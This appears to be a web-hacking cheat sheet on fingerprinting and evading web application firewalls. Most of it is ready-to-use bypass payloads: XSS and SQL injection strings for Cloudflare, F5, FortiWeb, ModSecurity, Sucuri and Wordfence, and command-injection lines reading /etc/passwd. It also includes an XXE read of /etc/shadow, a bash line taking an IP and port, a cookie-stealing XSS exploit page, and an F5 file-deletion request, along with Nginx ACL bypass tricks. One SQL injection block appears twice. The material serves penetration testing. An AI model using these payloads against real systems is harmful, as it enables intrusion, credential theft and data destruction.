# WAF Detection and Bypass

## Detection Techniques:
To identify WAFs, we need to (dummy) provoke it.

1. Make a normal `GET` request from a browser, intercept and record response headers (specifically cookies).
2. Make a request from command line (eg. cURL), and test response content and headers (no user-agent included).
3. Make `GET` requests to random open ports and grab banners which might expose the WAFs identity.
4. On login pages, inject common (easily detectable) payloads like `" or 1 = 1 --`.
5. Inject noisy payloads like `<script>alert()</script>` into search bars, contact forms and other input fields.
6. Attach a dummy `../../../etc/passwd` to a random parameter at end of URL.
7. Append some catchy keywords like `' OR SLEEP(5) OR '` at end of URLs to any random parameter.
8. Make GET requests with outdated protocols like `HTTP/0.9` (HTTP/0.9 does not support POST type queries).
9. Many a times, the WAF varies the Server header upon different types of interactions.
10. Drop Action Technique - Send a raw crafted `FIN/RST` packet to server and identify response.
  > Tip: This method could be easily achieved with tools like [HPing3](http://www.hping.org/) or [Scapy](https://scapy.net/).
11. Side Channel Attacks - Examine the timing behaviour of the request and response content.
  > Tip: More details can be found in a [blogpost here](https://0xinfection.github.io/posts/fingerprinting-wafs-side-channel/).

## WAF Fingerprints

| WAF | Fingerprints |
| --- | --- |
| ArvanCloud | &bull; **Detectability:** Moderate <br> &bull; **Detection:** `Server` header contains `ArvanCloud` keyword. |
| ASP.NET Generic | &bull; **Detectability:** Easy<br> &bull; **Detection:** Response headers may contain `X-ASPNET-Version` header value.<br> **Blocked response page content may contain:** <br>&bull;`This generic 403 error means that the authenticated user is not authorized to use the requested resource.`<br> &bull;`Error Code 0x00000000<` keyword. |
| BIG-IP ASM | &bull; **Detectability:** Moderate<br> &bull; **Detection:** <br> Response headers may contain `BigIP` or `F5` keyword value. <br> Response header fields may contain `X-WA-Info` header. <br> Response headers might have jumbled `X-Cnection` field value. | 
| Cloudflare | &bull; **Detectability:** Easy<br> &bull; **Detection:** <br> Response headers might have `cf-ray` field value.<br> `Server` header field has value `cloudflare`.<br> `Set-Cookie` response headers have `__cfuid=` cookie field.<br> Page content might have `Attention Required!` or `Cloudflare Ray ID:`.<br> Page content may contain `DDoS protection by Cloudflareas` text.<br> You may encounter `CLOUDFLARE_ERROR_500S_BOX` upon hitting invalid URLs. |
| FortiWeb | &bull; **Detectability:** Moderate <br> &bull; **Detection:** <br> Response headers contain `FORTIWAFSID=` on malicious requests. <br> Response headers contain cookie name `cookiesession1=` <br>**Blocked response page contains:** <br> Reference to `.fgd_icon` image icon. <br> `Server Unavailable!` as heading. <br> `Server unavailable. Please visit later.` as text.|



## Evasion Techniques
### Fuzzing/Bruteforcing:
Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:

* Wordlists specifically for fuzzing
  * [Seclists/Fuzzing.](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
  * [Fuzz-DB/Attack](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack)
  * [Other Payloads](https://github.com/foospidy/payloads)

**Technique:**
* Load up your wordlist into fuzzer and start the bruteforce.
* Record/log all responses from the different payloads fuzzed.
* Use random user-agents, ranging from Chrome Desktop to iPhone browser.
* If blocking noticed, increase fuzz latency (eg. 2-4 secs).
* Always use proxychains, since chances are real that your IP gets blocked.

### Blacklisting Detection/Bypass
**SQL Injection**
```bash
# Keywords Filtered: and, or, union
Probable Regex: preg_match('/(and|or|union)/i', $id)
Blocked Attempt: union select user, password from users
Bypassed Injection: 1 || (select user from users where user_id = 1) = 'admin'


# Keywords Filtered: and, or, union, where
Blocked Attempt: 1 || (select user from users where user_id = 1) = 'admin'
Bypassed Injection: 1 || (select user from users limit 1) = 'admin'


# Keywords Filtered: and, or, union, where, limit
Blocked Attempt: 1 || (select user from users limit 1) = 'admin'
Bypassed Injection: 1 || (select user from users group by user_id having user_id = 1) = 'admin'


# Keywords Filtered: and, or, union
Probable Regex: preg_match('/(and|or|union)/i', $id)
Blocked Attempt: union select user, password from users
Bypassed Injection: 1 || (select user from users where user_id = 1) = 'admin'


# Keywords Filtered: and, or, union, where
Blocked Attempt: 1 || (select user from users where user_id = 1) = 'admin'
Bypassed Injection: 1 || (select user from users limit 1) = 'admin'


# Keywords Filtered: and, or, union, where, limit
Blocked Attempt: 1 || (select user from users limit 1) = 'admin'
Bypassed Injection: 1 || (select user from users group by user_id having user_id = 1) = 'admin'
```

## Obfuscation
**1. Case Toggling**
```bash
# Standard
<script>alert()</script>
# Bypassed
<ScRipT>alert()</sCRipT>

# Standard
SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'
# Bypassed
sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'
```

**2. URL Encoding**
```bash
# Blocked
<svG/x=">"/oNloaD=confirm()//

# Bypassed
%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F

# Blocked
uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)

# Bypassed
uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29
```

**3. Unicode Normalization**
```bash
# Standard
<marquee onstart=prompt()>
# Obfuscated
<marquee onstart=\u0070r\u06f\u006dpt()>


# Blocked
/?redir=http://google.com
# Bypassed
/?redir=http://google。com (Unicode alternative)


# Blocked
<marquee loop=1 onfinish=alert()>x
# Bypassed
＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative)


# Standard
../../etc/passwd
# Obfuscated
%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd
```

**4. HTML Representation**
```bash
# Standard
"><img src=x onerror=confirm()>
# Encoded
&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt; (General form)
# Encoded
&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62; (Numeric reference)
```

**5. Using Comments**
```bash
# Blocked
<script>alert()</script>
# Bypassed
<!--><script>alert/**/()/**/</script>

# Blocked
/?id=1+union+select+1,2,3--
# Bypassed
/?id=1+un/**/ion+sel/**/ect+1,2,3--
```


## Cloudflare
### XSS Bypass
```javascript
<svg onx=() onload=(confirm)(1)>
<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
1'"><img/src/onerror=.1|alert``>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
<--`<img/src=` onerror=confirm``> --!>
javascript:{alert`0`}
<base href=//knoxss.me?
<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x

// RCE Payload Detection Bypass
cat$u+/etc$u/passwd$u
/bin$u/bash$u <ip> <port>
";cat+/etc/passwd+#
```

## Fortinet Fortiweb
```bash
# pcre_expression unvaidated XSS
/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0

# CSP Bypass
# POST Type Query
POST /<path>/login-app.aspx HTTP/1.1
Host: <host>
User-Agent: <any valid user agent string>
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <the content length must be at least 2399 bytes>

var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>

# GET Type Query
http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>

```

## F5 ASM
```javascript
# XSS Bypass
<table background="javascript:alert(1)"></table>
"/><marquee onfinish=confirm(123)>a</marquee>
```

## F5 BIG-IP
```javascript
// XSS Bypass
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)“>

// report_type XSS 
https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+

//POST Based XXE
POST /sam/admin/vpe2/public/php/server.php HTTP/1.1
Host: bigip
Cookie: BIGIPAuthCookie=*VALID_COOKIE*
Content-Length: 143

<?xml  version="1.0" encoding='utf-8' ?>
<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
<message><dialogueType>&e;</dialogueType></message>

// Directory Traversal
// Read Arbitrary File
/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd

// Delete Arbitrary File
POST /tmui/Control/form HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd"; f5currenttab="main"; f5mainmenuopenlist=""; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd
Content-Type: application/x-www-form-urlencoded

_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
```

## ModSecurity
```javascript
// XSS Bypass for CRS 3.2
<a href="jav%0Dascript&colon;alert(1)">

// RCE Payloads Detection Bypass for PL3
;+$u+cat+/etc$u/passwd$u

// RCE Payloads Detection Bypass for PL2
;+$u+cat+/etc$u/passwd+\#

// RCE Payloads for PL1 and PL2
/???/??t+/???/??ss??

// SQLi Bypass
0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
amUserId=1 union select username,password,3,4 from users
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
```

## Sucuri
```javascript
// XSS Bypass (POST Only)
<a href=javascript&colon;confirm(1)>

// Smuggling RCE Payloads
/???/??t+/???/??ss??

// Obfuscating RCE Payloads
;+cat+/e'tc/pass'wd
c\\a\\t+/et\\c/pas\\swd

// XSS Bypass
"><input/onauxclick="[1].map(prompt)">

// XSS Bypass
data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
<input type=hidden name=a value="<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>">
<input type=submit></form>
```

## Wordfence
```javascript
// XSS Bypass
<a href=javas&#99;ript:alert(1)>
<a href=&#01javascript:alert(1)>

// XSS Bypass
<a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&colon;/**/alert()/**/>click

// HTML Injection
http://host/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php

// XSS Exploit
<html>
<head>
<title>Wordfence Security XSS exploit (C) 2012 MustLive. 
http://websecurity.com.ua</title>
</head>
<body onLoad="document.hack.submit()">
<form name="hack" action="http://site/?_wfsf=unlockEmail" method="post">
<input type="hidden" name="email" 
value="<script>alert(document.cookie)</script>">
</form>
</body>
</html>

// Other XSS Bypasses
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

## Apache Generic
```javascript
// Writing method type in lowercase
get /login HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

## IIS Generic
```javascript
// Tabs before method
    GET /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

# Bypassing Nginx ACL Rules
Nginx restriction example:
```bash
location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
```
## NodeJS
![nodejs](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/8bd4e562-49e4-426f-aa27-353e9288b9cc)

* As Nginx includes the character \xa0 as part of the pathname, the ACL rule for the /admin URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;
* When the URI /admin\x0a is received by the Node.js server, the character \xa0 will be removed, allowing successful retrieval of the /admin endpoint.


| Nginx Version | Node.js Bypass Characters |
| --- | --- |
| 1.22.0 | `\xA0` |
| 1.21.6 | `\xA0` |
| 1.20.2 | `\xA0`, `\x09`, `\x0C` |
| 1.18.0 | `\xA0`, `\x09`, `\x0C` |
| 1.16.1 | `\xA0`, `\x09`, `\x0C` |

## Flask
Flask removes the characters `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`, and `\x09` from the URL path, but NGINX doesn't.

![flask](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/bf3267d0-9869-4bbf-a327-87fd7e5a101a)

| Nginx Version | Flask Bypass Characters |
| --- | --- |
| 1.22.0 | `\x85`, `\xA0` |
| 1.21.6 | `\x85`, `\xA0` |
| 1.20.2 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |


## Spring Boot
Below, you will find a demonstration of how ACL protection can be circumvented by adding the character \x09 or  at the end of the pathname:

![spring](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/415e6a60-2be7-4af0-8513-e27cf8df2329)

| Nginx Version | Spring Boot Bypass Characters |
| --- | --- |
| 1.22.0 | `;` |
| 1.21.6 | `;` |
| 1.20.2 | `\x09`, ; |
| 1.18.0 | `\x09`, `;` |
| 1.16.1 | `\x09`, `;` |


## PHP-FPM
Let's consider the following Nginx FPM configuration:
```bash
location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```

It's possible to bypass it accessing /admin.php/index.php:

![php](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/24ef2f4b-1cf4-46e7-975b-ef0135043326)


## How to prevent
To prevent these issues, you must use the ~ expression Instead of the = expression on Nginx ACL rules, for example:

COPYCOPY

```bash
location ~* ^/admin {
    deny all;
}
```

## Bypassing AWS WAF ACL With Line Folding
It's possible to bypass AWS WAF protection in a HTTP header by using the following syntax where the AWS WAF won't understand X-Query header contains a sql injection payload while the node server behind will:

```html
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```

* [References](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)


## Tools
* [GoTestWAF](https://github.com/wallarm/gotestwaf) - A tool to test a WAF's detection logic and bypasses

